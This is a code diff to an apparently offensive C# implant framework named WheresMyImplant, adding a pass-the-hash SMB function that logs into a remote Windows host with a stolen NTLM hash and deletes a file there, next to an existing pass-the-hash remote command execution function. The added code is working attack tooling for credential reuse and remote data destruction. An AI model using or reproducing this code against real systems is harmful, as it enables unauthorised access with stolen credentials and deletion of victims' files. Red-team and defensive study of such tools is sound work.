@@ -250,6 +250,79 @@ namespace WheresMyImplant
         }
 
         [ManagementTask]
+        public static String PTHSMBClientDelete(String uncPathDestination, String domain, String username, String hash)
+        {
+            StringBuilder output = new StringBuilder();
+            using (SMBClientDelete smbClient = new SMBClientDelete())
+            {
+                String target, share, folder, file = String.Empty;
+                try
+                {
+                    String[] path = uncPathDestination.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
+                    var enumerator = path.GetEnumerator();
+
+                    if (!enumerator.MoveNext())
+                        return "Invalid UNC Path";
+                    target = (String)enumerator.Current;
+
+                    if (!enumerator.MoveNext())
+                        return "Invalid UNC Path";
+                    share = (String)enumerator.Current;
+
+                    StringBuilder sbFolder = new StringBuilder();
+                    for (Int32 i = 2; i < path.Length - 1; i++)
+                        sbFolder.Append(path[i] + @"\");
+                    folder = sbFolder.ToString();
+                    file = path.Last();
+                }
+                catch (Exception ex)
+                {
+                    return ex.ToString();
+                }
+
+                if (!smbClient.Connect(target))
+                    return "[-] Unable to Connect";
+
+                smbClient.NegotiateSMB();
+                smbClient.NegotiateSMB2();
+                smbClient.NTLMSSPNegotiate();
+
+                if (!smbClient.Authenticate(domain, username, hash))
+                    return "[-] Login Failed";
+
+                try
+                {
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
+                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
+
+                    smbClient.CreateRequest(String.Empty, 1);
+                    smbClient.GetInfoRequest();
+                    smbClient.CreateRequest(folder + file, 2);
+                    smbClient.CloseRequest();
+                    smbClient.CreateRequest(String.Empty, 2);
+                    smbClient.CloseRequest();
+                    smbClient.FindRequest(folder);
+                    smbClient.CreateRequest(folder + file, 3);
+                    smbClient.SetInfoRequest();
+
+                    smbClient.CloseRequest();
+                    smbClient.DisconnectTree();
+                    smbClient.LogoffRequest();
+                }
+                catch (Exception ex)
+                {
+                    output.Append(ex.ToString());
+                }
+                finally
+                {
+                    output.Append(smbClient.GetOutput());
+                }
+            }
+            return output.ToString();
+        }
+
+        [ManagementTask]
         public static String PTHSMBExec(String target, String command, String domain, String username, String hash)
         {
             StringBuilder output = new StringBuilder();
